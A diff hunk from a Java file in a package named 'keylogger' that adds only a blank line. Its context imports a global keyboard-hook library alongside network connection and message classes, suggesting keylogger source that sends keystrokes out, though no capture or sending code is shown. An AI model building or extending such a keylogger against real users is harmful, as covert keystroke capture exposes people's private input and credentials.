@@ -1,5 +1,6 @@
 package keylogger;
 
+
 import network.Connection;
 import network.Message;
 import org.jnativehook.GlobalScreen;
